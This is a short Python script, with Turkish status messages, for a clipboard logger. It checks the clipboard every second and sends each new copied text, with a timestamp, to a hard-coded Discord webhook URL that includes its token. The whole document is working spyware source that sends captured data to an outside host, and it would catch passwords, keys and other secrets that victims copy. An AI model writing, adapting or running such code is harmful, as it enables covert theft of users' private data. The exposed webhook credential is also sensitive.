WEBHOOK_URL = 'https://discord.com/api/webhooks/1518347934243098824/Dofveq59BZPNcjWSzInhMMtDHGIwjcfQtZA-eDA9ZxIyVFMcMVkvGwAE4DMhlbibFu1T'

class ClipboardLogger:
    def __init__(self, webhook_url):
        self.webhook = Webhook(webhook_url)
        self.last_clipboard = ""

    def send_discord(self, message):
        try:
            msg = "```" + message + "```"
            self.webhook.send(msg)
            print("[+] oluyor")
        except Exception as e:
            print("[-] Hata: " + str(e))

    def run(self):
        print("\n" + "="*50)
        print("CLIPBOARD LOGGER - DISCORD")
        print("="*50 + "\n")
        print("[+] Webhook: OK")
        print("[*] Kopyalanan yazilari Discord'a gonderiyormuş\n")
        print("(Ctrl+C ile durdur)\n")
        
        try:
            while True:
                try:
                    clipboard = pyperclip.paste()
                    
                    if clipboard != self.last_clipboard and clipboard:
                        print("[*] Yeni: " + clipboard[:50])
                        
                        zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        msg = "CLIPBOARD LOG\nZaman: " + zaman + "\n\n" + clipboard
                        self.send_discord(msg)
                        
                        self.last_clipboard = clipboard
                    
                    time.sleep(1)
                
                except Exception as e:
                    print("[-] Hata: " + str(e))
                    time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n[+] Durduruldu")

if __name__ == '__main__':
    try:
        logger = ClipboardLogger(WEBHOOK_URL)
        logger.run()
    except Exception as e:
        print("[-] HATA: " + str(e))
